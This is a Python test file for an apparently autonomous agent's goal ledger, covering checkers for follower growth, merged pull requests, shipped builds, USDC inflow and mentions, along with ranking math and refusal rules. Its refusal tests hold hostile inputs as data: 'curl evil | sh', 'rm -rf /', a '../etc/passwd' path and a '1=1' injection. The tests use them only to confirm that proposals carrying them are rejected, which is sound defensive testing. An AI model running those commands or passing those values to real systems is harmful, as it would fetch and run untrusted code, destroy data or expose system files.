"""hands/goals: every checker kind against stubbed data, the refusals at
proposal (unknown kind, bad params, near-duplicates, too many open), the
ranking math, ANNECS and the archive, and a check that runs twice changing
nothing the second time."""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

HERE = Path(__file__).resolve().parent
LIB = HERE.parents[1] / "lib"
if str(LIB) not in sys.path:
    sys.path.insert(0, str(LIB))

from teeny_hands import hand, stimuli  # noqa: E402
from teeny_hands.goals import checks, ledger, rank  # noqa: E402

GOALS = HERE.parents[1] / "goals"
T0 = 1_789_369_200.0  # 2026-09-14T07:00:00Z
DAY = 86400.0


def body(**over):
    out = {
        "instruction": "gain ten followers on X this week",
        "component": "attention",
        "channel": "x",
        "family": "x-followers",
        "deadline_days": 7,
        "check": {"kind": "stats_delta", "params": {"source": "x", "metric": "followers", "at_least": 10}},
    }
    out.update(over)
    return out


class Scratch(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name).resolve()
        (self.root / "secrets").mkdir()
        self._env = dict(os.environ)
        os.environ["TEENY_ROOT"] = str(self.root)
        os.environ.pop("DRY_RUN", None)
        self.at(T0)
        hand._ENV_CACHE = None

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self._env)
        hand._ENV_CACHE = None
        self.tmp.cleanup()

    def at(self, when):
        os.environ["TEENY_NOW"] = str(when)

    def propose(self, **over):
        return ledger.propose(body(**over), source="test")

    def refused(self, rule, **over):
        with self.assertRaises(hand.Refused) as caught:
            self.propose(**over)
        self.assertEqual(caught.exception.detail.get("rule"), rule, caught.exception.reason)
        return caught.exception

    def goal(self, goal_id):
        return next(g for g in ledger.all_goals() if g["id"] == goal_id)

    def stats(self, value, at, source="x", metric="followers"):
        from teeny_hands.stats import collect

        conn = collect.db()
        with hand.transaction(conn):
            conn.execute("INSERT OR REPLACE INTO stats (date, source, metric, value, at) VALUES (?,?,?,?,?)",
                         (f"d{at}", source, metric, value, at))
        conn.close()


# --- every checker kind ----------------------------------------------------------------------------


class StatsDeltaTest(Scratch):
    def test_solved_when_the_metric_rose_by_at_least_the_bar_since_proposal(self):
        self.stats(100, T0 - 3600)
        out = self.propose()
        self.assertEqual(out["baseline"], 100)
        self.at(T0 + DAY)
        self.stats(105, T0 + DAY - 60)
        self.assertEqual(ledger.check()["moved"], [])
        self.stats(111, T0 + 2 * DAY - 60)
        self.at(T0 + 2 * DAY)
        moved = ledger.check()["moved"]
        self.assertEqual([(m["id"], m["status"]) for m in moved], [(out["goal_id"], "solved")])
        self.assertEqual(moved[0]["evidence"]["rise"], 11)

    def test_a_metric_with_no_row_yet_stays_open_then_takes_its_baseline_at_the_first_check(self):
        out = self.propose()
        self.assertNotIn("baseline", out)
        self.assertIn("unavailable", ledger.check()["open"][0]["evidence"])
        self.stats(50, T0 + 600)
        self.at(T0 + 3600)
        ledger.check()
        self.assertEqual(self.goal(out["goal_id"])["baseline"], 50)

    def test_failed_after_the_deadline_without_the_rise(self):
        self.stats(100, T0 - 60)
        out = self.propose(deadline_days=1)
        self.stats(103, T0 + DAY - 60)
        self.at(T0 + DAY + 1)
        moved = ledger.check()["moved"]
        self.assertEqual([(m["id"], m["status"]) for m in moved], [(out["goal_id"], "failed")])


def pr(merged_at, repo="tinyhumansai/openhuman", url="https://github.com/tinyhumansai/openhuman/pull/1"):
    return {"repo": repo, "number": 1, "merged_at": merged_at, "html_url": url}


class PrMergedTest(Scratch):
    def propose_pr(self, **params):
        return self.propose(instruction="land a pull request in openhuman", component="capability",
                            channel="github", family="upstream-pr",
                            check={"kind": "pr_merged", "params": {"repo": "tinyhumansai/openhuman", **params}})

    def test_solved_by_a_pr_merged_inside_the_window_and_defaults_to_teenys_login(self):
        out = self.propose_pr()
        with mock.patch.object(checks, "merged_prs", return_value=[pr("2026-09-15T00:00:00Z")]) as search, \
                mock.patch.object(checks, "github_user", return_value="teenydroid"):
            moved = ledger.check()["moved"]
        search.assert_called_once_with("tinyhumansai/openhuman", "teenydroid", T0)
        self.assertEqual((moved[0]["id"], moved[0]["status"]), (out["goal_id"], "solved"))

    def test_a_pr_merged_before_the_goal_or_elsewhere_does_not_count(self):
        self.propose_pr(author="someone")
        stale = [pr("2026-09-13T00:00:00Z"), pr("2026-09-15T00:00:00Z", repo="other/repo")]
        with mock.patch.object(checks, "merged_prs", return_value=stale):
            self.assertEqual(ledger.check()["moved"], [])

    def test_a_github_error_leaves_it_open(self):
        self.propose_pr()
        with mock.patch.object(checks, "merged_prs", side_effect=hand.HandError("GITHUB_TOKEN is not set")), \
                mock.patch.object(checks, "github_user", return_value="teenydroid"):
            result = ledger.check()
        self.assertEqual(result["moved"], [])
        self.assertIn("GITHUB_TOKEN", result["open"][0]["evidence"]["unavailable"])


class BuildShippedTest(Scratch):
    def test_solved_by_a_build_shipped_after_proposal(self):
        out = self.propose(instruction="ship one program people can use", component="shipped", channel="github",
                           family="weekly-ship", check={"kind": "build_shipped", "params": {}})
        from teeny_hands.build import jobs

        conn = jobs.db()
        with hand.transaction(conn):
            conn.execute("INSERT INTO build_jobs (kind, slug, repo, text, workdir, status, claimed_at, shipped_at,"
                         " repo_url) VALUES ('daily','old','r','t','w','shipped',?,?,'u0')", (T0 - DAY, T0 - 60))
        self.assertEqual(ledger.check()["moved"], [])
        with hand.transaction(conn):
            conn.execute("INSERT INTO build_jobs (kind, slug, repo, text, workdir, status, claimed_at, shipped_at,"
                         " repo_url) VALUES ('daily','new','r','t','w','shipped',?,?,'u1')", (T0, T0 + 60))
        conn.close()
        moved = ledger.check()["moved"]
        self.assertEqual((moved[0]["id"], moved[0]["status"], moved[0]["evidence"]["shipped"]),
                         (out["goal_id"], "solved", ["u1"]))

    def test_build_shipped_takes_no_params(self):
        self.refused("check_params", check={"kind": "build_shipped", "params": {"cmd": "true"}})


class WalletInflowTest(Scratch):
    def propose_inflow(self):
        return self.propose(instruction="earn five dollars in USDC from strangers", component="money",
                            channel="wallet", family="tips",
                            check={"kind": "wallet_inflow", "params": {"at_least_usdc": 5}})

    def test_solved_when_the_balance_rose_with_payments_out_added_back(self):
        with mock.patch.object(checks, "usdc_balance", return_value=10_000_000):
            out = self.propose_inflow()
        self.assertEqual(out["baseline"], 10_000_000)
        with mock.patch.object(checks, "usdc_balance", return_value=12_000_000), \
                mock.patch.object(checks, "usdc_paid_out", return_value=2_000_000):
            self.assertEqual(ledger.check()["moved"], [])
        with mock.patch.object(checks, "usdc_balance", return_value=12_000_000), \
                mock.patch.object(checks, "usdc_paid_out", return_value=3_000_000):
            moved = ledger.check()["moved"]
        self.assertEqual(moved[0]["status"], "solved")
        self.assertEqual(moved[0]["evidence"]["inflow_usdc"], 5.0)

    def test_an_unreadable_wallet_takes_the_baseline_later(self):
        with mock.patch.object(checks, "usdc_balance", side_effect=hand.HandError("no wallet")):
            out = self.propose_inflow()
            ledger.check()
        self.assertNotIn("baseline", self.goal(out["goal_id"]))
        with mock.patch.object(checks, "usdc_balance", return_value=1), \
                mock.patch.object(checks, "usdc_paid_out", return_value=0):
            ledger.check()
        self.assertEqual(self.goal(out["goal_id"])["baseline"], 1)


class WorldDeltaTest(Scratch):
    def propose_world(self):
        return self.propose(instruction="move attention in W by half a point", component="attention", channel="web",
                            family="world-attention",
                            check={"kind": "world_delta", "params": {"component": "attention", "at_least": 0.5}})

    def test_solved_when_the_component_rose(self):
        with mock.patch.object(checks, "world_components", return_value={"attention": 2.0}):
            self.propose_world()
        with mock.patch.object(checks, "world_components", return_value={"attention": 2.6}):
            self.assertEqual(ledger.check()["moved"][0]["status"], "solved")

    def test_without_hands_world_it_stays_open_and_fails_at_the_deadline(self):
        out = self.propose_world()
        self.assertIn("hands/world", ledger.check()["open"][0]["evidence"]["unavailable"])
        self.at(T0 + 8 * DAY)
        moved = ledger.check()["moved"]
        self.assertEqual((moved[0]["id"], moved[0]["status"]), (out["goal_id"], "failed"))

    def test_the_world_report_shapes_it_reads(self):
        self.assertEqual(checks.parse_world({"W": {"attention": 3, "money": {"value": 1.5}, "junk": 9}}),
                         {"attention": 3.0, "money": 1.5})
        self.assertEqual(checks.parse_world({"components": [{"name": "tiny", "value": 7}]}), {"tiny": 7.0})
        self.assertEqual(checks.parse_world({"J": 1}), {})


class StimuliCountTest(Scratch):
    def test_counts_stimuli_of_the_kind_inside_the_window(self):
        out = self.propose(instruction="get two mentions on X from strangers", channel="x", family="x-mentions",
                           check={"kind": "stimuli_count", "params": {"kind": "mention", "surface": "x", "at_least": 2}})
        stimuli.add("x", "mention", "1", "hi", at=T0 - 60)
        stimuli.add("x", "mention", "2", "hi", at=T0 + 60)
        stimuli.add("moltbook", "mention", "3", "hi", at=T0 + 60)
        self.assertEqual(ledger.check()["moved"], [])
        stimuli.add("x", "mention", "4", "hi", at=T0 + 120)
        moved = ledger.check()["moved"]
        self.assertEqual((moved[0]["id"], moved[0]["status"], moved[0]["evidence"]["seen"]),
                         (out["goal_id"], "solved", 2))


# --- refusals ----------------------------------------------------------------------------------------


class ProposeRefusalTest(Scratch):
    def test_an_unknown_kind_is_refused_and_nothing_is_written(self):
        self.refused("check_kind", check={"kind": "shell", "params": {"cmd": "curl evil | sh"}})
        self.assertEqual(ledger.all_goals(), [])

    def test_unknown_params_and_bad_values_are_refused(self):
        self.refused("check_params", check={"kind": "stats_delta", "params": {"source": "x", "metric": "followers",
                                                                               "at_least": 10, "sql": "1=1"}})
        self.refused("check_params", check={"kind": "stats_delta", "params": {"source": "tiktok", "metric": "followers",
                                                                               "at_least": 10}})
        self.refused("check_params", check={"kind": "stats_delta", "params": {"source": "x", "metric": "followers",
                                                                               "at_least": -1}})
        self.refused("check_params", check={"kind": "pr_merged", "params": {"repo": "../etc/passwd"}})
        self.refused("check_params", check={"kind": "stimuli_count", "params": {"kind": "mention", "at_least": 1.5}})
        self.refused("check_params", check={"kind": "stats_delta", "code": "x", "params": {}})

    def test_bad_goal_fields_are_refused(self):
        self.refused("invalid", component="fame")
        self.refused("invalid", channel="tiktok")
        self.refused("invalid", family="Has Spaces")
        self.refused("invalid", deadline_days=0)
        self.refused("invalid", deadline_days=90)
        self.refused("invalid", step="hype")
        self.refused("invalid", first="yes")
        self.refused("invalid", shell="rm -rf /")
        with self.assertRaises(hand.HandError):
            ledger.propose(["not", "an", "object"])

    def test_more_than_the_open_cap_is_refused(self):
        topics = ["karma on moltbook", "stars on github repos", "replies under posts", "issues opened by strangers",
                  "forks of shipped programs", "mail from new people"]
        for i, topic in enumerate(topics[: ledger.MAX_OPEN]):
            self.propose(instruction=f"grow {topic}", family=f"f{i}x",
                         check={"kind": "stimuli_count", "params": {"kind": f"k{i}", "at_least": 1}})
        self.refused("too_many_open", instruction=f"grow {topics[-1]}", family="last",
                     check={"kind": "stimuli_count", "params": {"kind": "other", "at_least": 1}})


class NearDuplicateTest(Scratch):
    def test_the_same_words_are_a_duplicate_of_an_open_goal(self):
        first = self.propose()
        err = self.refused("duplicate", instruction="Gain 10 followers on X this week!",
                           check={"kind": "stimuli_count", "params": {"kind": "follow", "at_least": 10}})
        self.assertEqual(err.detail["duplicate_of"], first["goal_id"])

    def test_the_same_check_at_about_the_same_bar_is_a_duplicate(self):
        self.propose()
        self.refused("duplicate", instruction="make my X audience bigger",
                     check={"kind": "stats_delta", "params": {"source": "x", "metric": "followers", "at_least": 12}})

    def test_a_much_higher_bar_or_another_metric_is_a_new_goal(self):
        self.propose()
        self.propose(instruction="make my X audience much bigger",
                     check={"kind": "stats_delta", "params": {"source": "x", "metric": "followers", "at_least": 50}})
        self.propose(instruction="post more on X than before",
                     check={"kind": "stats_delta", "params": {"source": "x", "metric": "posts", "at_least": 10}})
        self.assertEqual(len(ledger.all_goals()), 3)

    def test_a_goal_resolved_long_ago_may_return_but_is_not_novel_if_it_was_solved(self):
        self.stats(0, T0 - 60)
        first = self.propose(deadline_days=1)
        self.stats(20, T0 + 60)
        self.at(T0 + 120)
        ledger.check()
        self.assertEqual(self.goal(first["goal_id"])["status"], "solved")
        self.refused("duplicate")
        self.at(T0 + (ledger.RECENT_DAYS + 1) * DAY)
        again = self.propose()
        self.assertFalse(again["novel"])

    def test_words_and_jaccard(self):
        self.assertEqual(rank.words("Gain the followers on X"), frozenset({"follower", "x"}))
        self.assertAlmostEqual(rank.jaccard({"a", "b"}, {"b", "c"}), 1 / 3)


# --- ranking math -------------------------------------------------------------------------------------


def g(id, family, status, resolved_at=None, component="attention", channel="x", first=False, novel=True,
      instruction=None, check_kind="stimuli_count", params=None, p_hat=0.5):
    return {"id": id, "family": family, "status": status, "resolved_at": resolved_at, "component": component,
            "channel": channel, "first": first, "novel": novel, "instruction": instruction or f"goal number {id} {family}",
            "check_kind": check_kind, "params": params or {"kind": f"k{id}", "at_least": 1}, "deadline_at": T0 + DAY,
            "p_hat": p_hat}


class RankMathTest(unittest.TestCase):
    def test_learning_progress_is_the_change_in_rate_between_windows(self):
        now = T0
        recent = [g(i, "f", "solved", now - DAY) for i in range(1, 4)]  # 3/3 recent
        older = [g(i, "f", "failed", now - 20 * DAY) for i in range(4, 7)]  # 0/3 older
        stats = rank.family_stats(recent + older, now)["f"]
        self.assertAlmostEqual(stats["lp"], abs(4 / 5 - 1 / 5))
        self.assertAlmostEqual(stats["p_hat"], (3 + 1) / (6 + 2))
        self.assertTrue(stats["in_band"])

    def test_a_family_always_solved_or_never_solved_is_out_of_the_band(self):
        always = [g(i, "easy", "solved", T0 - DAY) for i in range(1, 4)]
        never = [g(i, "hard", "failed", T0 - DAY) for i in range(4, 7)]
        stats = rank.family_stats(always + never, T0)
        self.assertFalse(stats["easy"]["in_band"])
        self.assertFalse(stats["hard"]["in_band"])
        out = rank.rank(always + never + [g(9, "easy", "open")], T0)
        self.assertEqual(out["goals"][0]["score"], 0)

    def test_a_new_family_explores_with_the_unknown_lp(self):
        stats = rank.family_stats([g(1, "new", "open")], T0)["new"]
        self.assertEqual((stats["lp"], stats["p_hat"], stats["interest"]), (rank.LP_UNKNOWN, 0.5, 1.5))

    def test_a_stalled_family_keeps_the_floor(self):
        flat = [g(1, "f", "solved", T0 - DAY), g(2, "f", "failed", T0 - DAY),
                g(3, "f", "solved", T0 - 20 * DAY), g(4, "f", "failed", T0 - 20 * DAY)]
        self.assertEqual(rank.family_stats(flat, T0)["f"]["lp"], rank.LP_FLOOR)

    def test_the_score_multiplies_every_term(self):
        goals = [g(1, "f", "solved", T0 - DAY), g(2, "f", "failed", T0 - 20 * DAY), g(3, "f", "open", component="money")]
        fam = rank.family_stats(goals, T0)["f"]
        got = rank.score(goals[2], fam, goals)
        want = fam["lp"] * 1 * (1 - fam["p_hat"]) * fam["interest"] * rank.WEIGHTS["money"]
        self.assertAlmostEqual(got["score"], round(want, 6))

    def test_a_checkable_first_weighs_double_until_one_like_it_is_solved(self):
        open_first = g(2, "f", "open", first=True, check_kind="pr_merged", params={"repo": "a/b"})
        goals = [open_first]
        fam = rank.family_stats(goals, T0)["f"]
        self.assertEqual(rank.score(open_first, fam, goals)["first"], rank.FIRST_WEIGHT)
        done = g(1, "f", "solved", T0 - DAY, check_kind="pr_merged", params={"repo": "A/B"})
        self.assertEqual(rank.score(open_first, fam, goals + [done])["first"], 1.0)

    def test_rank_orders_open_goals_by_score(self):
        goals = [g(1, "a", "open", component="world"), g(2, "b", "open", component="attention")]
        self.assertEqual([r["id"] for r in rank.rank(goals, T0)["goals"]], [2, 1])


class AnnecsTest(unittest.TestCase):
    def test_counts_novel_solved_goals_once_and_skips_near_duplicates(self):
        goals = [
            g(1, "f", "solved", T0 - 3 * DAY, instruction="land a pull request in openhuman"),
            g(2, "f", "solved", T0 - 2 * DAY, instruction="land a pull request in openhuman again"),
            g(3, "f", "solved", T0 - DAY, novel=False, instruction="something else entirely here"),
            g(4, "g", "failed", T0 - DAY, instruction="earn a tip"),
            g(5, "h", "open", instruction="ship a thing"),
            g(6, "h", "solved", T0, component="shipped", channel="github", instruction="ship a weekly program"),
        ]
        out = rank.annecs(goals, ledger.CHANNELS)
        self.assertEqual((out["annecs"], out["counted"], out["solved"]), (2, [1, 6], 4))
        archive = out["archive"]
        self.assertEqual((archive["cells"], archive["filled"]), (42, 2))
        cells = {(n["component"], n["channel"]): n for n in archive["niches"]}
        self.assertEqual(cells[("attention", "x")]["solved"], 3)
        self.assertNotIn("attention/x", archive["empty"])
        self.assertIn("money/wallet", archive["empty"])

    def test_the_best_in_a_niche_is_the_highest_quality(self):
        goals = [g(1, "f", "solved", T0 - DAY, p_hat=0.8), g(2, "f", "solved", T0, p_hat=0.3, first=True)]
        best = rank.annecs(goals, ledger.CHANNELS)["archive"]["niches"][0]["best"]
        self.assertEqual(best["id"], 2)


# --- check: idempotent, and the mind hears --------------------------------------------------------


class CheckTest(Scratch):
    def test_a_second_check_changes_nothing_and_the_mind_hears_once(self):
        self.stats(0, T0 - 60)
        out = self.propose()
        self.stats(30, T0 + 60)
        self.at(T0 + 120)
        self.assertEqual(len(ledger.check()["moved"]), 1)
        before = self.goal(out["goal_id"])
        self.at(T0 + 3600)
        self.assertEqual(ledger.check(), {"moved": [], "open": []})
        self.assertEqual(self.goal(out["goal_id"]), before)
        told = [s for s in stimuli.pending() if (s["surface"], s["kind"]) == ("self", "goal")]
        self.assertEqual(len(told), 1)
        self.assertIn("solved", told[0]["text"])

    def test_the_hand_answers_the_contract(self):
        env = {**os.environ, "TEENY_ROOT": str(self.root)}
        proc = subprocess.run([str(GOALS), "propose"], input=json.dumps(body(check={"kind": "nope"})),
                              capture_output=True, text=True, env=env)
        self.assertEqual(proc.returncode, 2)
        self.assertEqual(json.loads(proc.stdout)["rule"], "check_kind")
        proc = subprocess.run([str(GOALS), "propose"], input=json.dumps(body()), capture_output=True, text=True, env=env)
        self.assertEqual(proc.returncode, 0, proc.stdout)
        for argv in (["list", "--status", "open"], ["rank"], ["annecs"], ["check"]):
            proc = subprocess.run([str(GOALS), *argv], capture_output=True, text=True, env=env, stdin=subprocess.DEVNULL)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertTrue(json.loads(proc.stdout)["ok"])
        listed = json.loads(subprocess.run([str(GOALS), "list", "--status", "open"], capture_output=True, text=True,
                                           env=env).stdout)
        self.assertEqual(len(listed["goals"]), 1)


if __name__ == "__main__":
    unittest.main()
